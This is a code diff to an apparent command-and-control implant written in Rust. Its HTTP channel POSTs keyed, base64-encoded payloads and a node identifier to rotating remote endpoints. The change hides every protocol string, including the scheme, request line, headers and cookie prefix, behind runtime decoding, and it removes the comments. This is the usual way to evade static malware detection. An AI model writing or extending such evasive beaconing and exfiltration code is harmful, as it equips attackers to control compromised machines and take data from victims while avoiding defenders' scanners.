@@ -1,11 +1,14 @@
 use std::io::{Read, Write};
 use std::net::TcpStream;
+use std::net::ToSocketAddrs;
 use std::time::Duration;
 
 use base64::Engine;
 use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
 
 use super::{Channel, ChannelInfo, Latency, SendContext};
+
+use crate::strings;
 
 pub struct HTTPChannel {
     endpoints: Vec<String>,
@@ -39,13 +42,14 @@ impl HTTPChannel {
     }
 
     fn parse_host_port(endpoint: &str) -> (&str, &str, u16) {
-        // Strip scheme
+        let https = strings::decode_str(strings::HTTPS_SCHEME);
+        let http = strings::decode_str(strings::HTTP_SCHEME);
+
         let without_scheme = endpoint
-            .strip_prefix("https://")
-            .or_else(|| endpoint.strip_prefix("http://"))
+            .strip_prefix(&https)
+            .or_else(|| endpoint.strip_prefix(&http))
             .unwrap_or(endpoint);
 
-        // Split host and port
         let (host, port) = if let Some(pos) = without_scheme.rfind(':') {
             let p = without_scheme[pos + 1..]
                 .trim_end_matches('/')
@@ -54,7 +58,7 @@ impl HTTPChannel {
             (&without_scheme[..pos], p)
         } else {
             let host = without_scheme.trim_end_matches('/');
-            if endpoint.starts_with("https://") {
+            if endpoint.starts_with(&https) {
                 (host, 443u16)
             } else {
                 (host, 80u16)
@@ -88,10 +92,12 @@ impl Channel for HTTPChannel {
         let body = format!("{}{}", key_id_hex, payload_b64);
 
         let addr = format!("{}:{}", host, port);
-        let mut stream = match TcpStream::connect_timeout(
-            &addr.parse()?,
-            Duration::from_secs(30),
-        ) {
+        let sock_addr = addr
+            .to_socket_addrs()?
+            .next()
+            .ok_or("resolve failed")?;
+
+        let mut stream = match TcpStream::connect_timeout(&sock_addr, Duration::from_secs(30)) {
             Ok(s) => s,
             Err(e) => {
                 self.advance_endpoint();
@@ -100,24 +106,25 @@ impl Channel for HTTPChannel {
         };
         stream.set_read_timeout(Some(Duration::from_secs(30)))?;
 
-        let request = format!(
-            "POST / HTTP/1.1\r\n\
-             Host: {}\r\n\
-             Content-Type: application/x-www-form-urlencoded\r\n\
-             Content-Length: {}\r\n\
-             Cookie: sid={}\r\n\
-             Connection: close\r\n\
-             \r\n\
-             {}",
-            host,
-            body.len(),
-            ctx.node_id,
-            body,
-        );
+        // Build request from runtime-decoded strings
+        let mut req = Vec::with_capacity(256 + body.len());
+        req.extend_from_slice(&strings::decode(strings::POST_LINE));
+        req.extend_from_slice(&strings::decode(strings::HOST_PREFIX));
+        req.extend_from_slice(host.as_bytes());
+        req.extend_from_slice(&strings::decode(strings::CRLF));
+        req.extend_from_slice(&strings::decode(strings::CONTENT_TYPE_HEADER));
+        req.extend_from_slice(&strings::decode(strings::CONTENT_LENGTH));
+        req.extend_from_slice(body.len().to_string().as_bytes());
+        req.extend_from_slice(&strings::decode(strings::CRLF));
+        req.extend_from_slice(&strings::decode(strings::COOKIE_PREFIX));
+        req.extend_from_slice(ctx.node_id.as_bytes());
+        req.extend_from_slice(&strings::decode(strings::CRLF));
+        req.extend_from_slice(&strings::decode(strings::CONNECTION_CLOSE));
+        req.extend_from_slice(&strings::decode(strings::CRLF));
+        req.extend_from_slice(body.as_bytes());
 
-        stream.write_all(request.as_bytes())?;
+        stream.write_all(&req)?;
 
-        // Read response
         let mut response = Vec::new();
         let mut buf = [0u8; 4096];
         loop {
@@ -130,17 +137,17 @@ impl Channel for HTTPChannel {
             }
         }
 
-        // Extract body from response
         let response_str = String::from_utf8_lossy(&response);
         if let Some(pos) = response_str.find("\r\n\r\n") {
-            let body = &response[pos + 4..];
-            if body.is_empty() {
+            let resp_body = &response[pos + 4..];
+            if resp_body.is_empty() {
                 Ok(None)
             } else {
-                Ok(Some(body.to_vec()))
+                Ok(Some(resp_body.to_vec()))
             }
         } else {
             Ok(None)
         }
     }
+
 }
